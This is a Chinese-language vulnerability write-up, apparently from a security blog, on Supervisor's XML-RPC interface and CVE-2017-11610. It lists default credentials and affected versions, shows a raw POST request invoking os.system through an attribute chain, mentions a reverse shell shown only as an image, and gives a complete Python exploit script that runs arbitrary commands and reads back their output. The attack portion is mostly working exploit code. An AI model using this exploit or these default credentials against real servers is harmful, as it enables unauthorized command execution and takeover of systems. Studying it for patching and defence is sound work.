{"title":"Supervisor服务脆弱性","slug":"网安大类/漏洞脆弱性分析/监控(Monitor)/Supervisor服务脆弱性","date":"2019-05-25T05:36:30.000Z","updated":"2023-01-31T02:29:10.673Z","url":"2019/5-25-426.html","path":"api/articles/2019/5-25-426.html.json","covers":["https://img.weiyigeek.top/2019/20190525224756.png","https://img.weiyigeek.top/2019/20190525224846.png","https://img.weiyigeek.top/2019/20190525225305.png"],"content":"<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0-supervisor缺省配置\"><a href=\"#0-supervisor缺省配置\" class=\"headerlink\" title=\"0.supervisor缺省配置\"></a>0.supervisor缺省配置</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">默认配置文件路径：/etc/supervisor.conf</span><br><span class=\"line\">网站和开放端口：http://localhost:9001</span><br><span class=\"line\">sock目录：unix:////tmp/supervisor.sock</span><br><span class=\"line\">缺省账号密码：</span><br><span class=\"line\">chris/123          </span><br><span class=\"line\">user/123</span><br></pre></td></tr></table></figure>\n<hr>\n\n<h4 id=\"1-Supervisor远程命令执行漏洞分析-CVE-2017-11610\"><a href=\"#1-Supervisor远程命令执行漏洞分析-CVE-2017-11610\" class=\"headerlink\" title=\"1.Supervisor远程命令执行漏洞分析|CVE-2017-11610\"></a>1.Supervisor远程命令执行漏洞分析|CVE-2017-11610</h4><p>Supervisor是一个用Python写的进程管理工具，可以很方便的用来启动、重启、关闭进程；用于管理后台应用（服务）的工具，方便运维人员使用图形化界面进行管理，是 Linux 服务器管理的效率工具；</p>\n<p><em>漏洞描述：</em><br>本次漏洞就出在XML-RPC接口对数据的处理上,默认情况下Supervisor并不会开启这个接口（XML-RPC 在 9001 端口上），相反的是在Supervisor的使用中，很多人喜欢利用web页面来管理，而不是使用上文中提到的supervisorctl命令行工具，使用web页面有一个方便之处，即通过简单配置，使用者可以在其他机器的浏览器上通过网址访问并控制Supervisor，省去非一定在本地配置的麻烦（例如在docker中使用Supervisor，就不用每次进入容器控制Supervisor），开启web访问的配置如下；</p>\n<p>利用该漏洞远程POST请求，向Supervisord管理界面提交恶意数据，可以获取服务器操作权限。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;[inet_http_server]         ; inet (TCP) server disabled by default</span><br><span class=\"line\">;port=127.0.0.1:9001        ; ip_address:port specifier, *:port <span class=\"keyword\">for</span> all iface</span><br><span class=\"line\">;username=user              ; default is no username (open server)</span><br><span class=\"line\">;password=123               ;</span><br></pre></td></tr></table></figure>\n<p><em>利用条件：</em></p>\n<ul>\n<li>Supervisor版本在受影响范围内 （Supervisor version 3.1.2&lt;=   x &lt;=Supervisor version 3.3.2）</li>\n<li>已修复版本：Supervisor 3.3.3、Supervisor 3.2.4、Superivsor 3.1.4、Supervisor 3.0.</li>\n<li>Supervisor 9001 管理端口可以被外网访问</li>\n<li>Supervisor 未配置密码或使用弱密码</li>\n</ul>\n<p><em>漏洞利用：</em><br>下面举个例子：在这里利用python使用RPC协议给supervisord发一个请求，来看下RPC协议的结构和params、method分别是什么。<br>抓取的流量如下图：<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/20190525224756.png\" alt=\"WeiyiGeek.wirshaek\" title=\"\" class=\"\">\n                <p>WeiyiGeek.wirshaek</p>\n            </figure><br>以此类推，最终的os会是链状结构最后一个方法，然后传入params值，被执行所以如果想攻击利用成功，必须找到一个调用链方法例：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">supervisor.supervisord.options.warnings.linecache.os.system</span><br></pre></td></tr></table></figure></p>\n<p>采用burpsuite进行重放：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /RPC2 HTTP/1.1</span><br><span class=\"line\">Host: localhost</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Accept-Language: en</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 275</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=<span class=\"string\">\"1.0\"</span>?&gt;</span><br><span class=\"line\">&lt;methodCall&gt;</span><br><span class=\"line\">&lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;</span><br><span class=\"line\">&lt;params&gt;</span><br><span class=\"line\">&lt;param&gt;</span><br><span class=\"line\">&lt;string&gt;touch /tmp/success&lt;/string&gt;</span><br><span class=\"line\">&lt;/param&gt;</span><br><span class=\"line\">&lt;/params&gt;</span><br><span class=\"line\">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/20190525224846.png\" alt=\"WeiyiGeek.burpsuite\" title=\"\" class=\"\">\n                <p>WeiyiGeek.burpsuite</p>\n            </figure></p>\n<p>Shell反弹：<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/20190525225305.png\" alt=\"WeiyiGeek.recv\" title=\"\" class=\"\">\n                <p>WeiyiGeek.recv</p>\n            </figure></p>\n<p><em>补充思路：</em><br>在微博上提出的一个思路，甚是有效，就是将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"comment\">#useage：exp.py http://user:pass@127.0.0.1:9001 whoami</span></span><br><span class=\"line\">import xmlrpc.client</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">target = sys.argv[1]</span><br><span class=\"line\"><span class=\"built_in\">command</span> = sys.argv[2]</span><br><span class=\"line\"></span><br><span class=\"line\">with xmlrpc.client.ServerProxy(target) as proxy:</span><br><span class=\"line\">    old = getattr(proxy, <span class=\"string\">'supervisor.readLog'</span>)(0,0)</span><br><span class=\"line\">    logfile = getattr(proxy, <span class=\"string\">'supervisor.supervisord.options.logfile.strip'</span>)()</span><br><span class=\"line\">    getattr(proxy, <span class=\"string\">'supervisor.supervisord.options.warnings.linecache.os.system'</span>)(<span class=\"string\">'&#123;&#125; | tee -a &#123;&#125;'</span>.format(<span class=\"built_in\">command</span>, logfile))</span><br><span class=\"line\">    result = getattr(proxy, <span class=\"string\">'supervisor.readLog'</span>)(0,0)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(result[len(old):])</span><br></pre></td></tr></table></figure></p>\n","comments":true,"excerpt":"[TOC]","categories":[{"name":"漏洞分析","path":"api/categories/漏洞分析.json"}],"tags":[{"name":"Supervisor","path":"api/tags/Supervisor.json"}]}